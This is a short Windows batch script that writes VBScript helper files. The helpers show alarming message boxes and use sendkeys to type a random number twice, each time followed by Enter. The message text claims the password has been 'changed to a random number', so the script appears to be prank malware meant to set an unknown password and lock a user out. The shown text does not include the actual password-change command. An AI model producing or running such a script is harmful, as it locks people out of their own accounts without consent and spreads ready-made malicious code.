@echo off
set x=%random%
echo x=msgbox("Password changed to a random number !!!!!!!!!!",48,"!@#$%^&*")>m.vbs
echo x=msgbox("##Password change unsuccessful##",48,"!@#$%^&*")>o.vbs
echo Set wshShell = wscript.CreateObject("WScript.Shell")>j.vbs
echo Set wshShell = wscript.CreateObject("WScript.Shell")>t.vbs
echo wshshell.sendkeys "(exit)">>t.vbs
echo wshshell.sendkeys "{ENTER}">>t.vbs
echo wshshell.sendkeys "(%x%)">>j.vbs
echo wshshell.sendkeys "{ENTER}">>j.vbs
echo wshshell.sendkeys "(%x%)">>j.vbs
echo wshshell.sendkeys "{ENTER}">>j.vbs